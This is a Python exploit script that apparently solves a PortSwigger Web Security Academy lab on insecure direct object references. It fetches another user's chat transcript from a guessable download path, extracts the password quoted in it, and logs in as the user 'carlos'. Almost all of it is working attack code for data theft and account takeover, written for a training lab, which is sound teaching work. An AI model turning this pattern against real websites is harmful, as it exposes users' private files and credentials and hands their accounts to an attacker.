#!/usr/bin/env python3
# Lab: Insecure direct object references
# Lab-Link: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_password(client, host):
    r = client.get(f'{host}/download-transcript/1.txt')
    if r.status_code != 200:
        print(f'[-] Failed to download transcript')
        return None
    print(f'[+] Downloaded transcript')

    content = r.content.decode()
    for line in content.splitlines():
        if 'Ok so my password is ' in line:
            return line.split("Ok so my password is ")[1].split(". Is that right")[0]
    return None


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Congratulations, you solved the lab!' in res.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    password = get_password(client, host)
    if password is None:
        print(f'[-] Failed to extract password')
        sys.exit(-2)
    print(f'[+] Extracted password: {password}')

    if not login(client, host, 'carlos', password):
        print(f'[-] Failed to login as user carlos')
        sys.exit(-3)

    print(f'[+] Logged in as user carlos, lab solved')


if __name__ == "__main__":
    main()
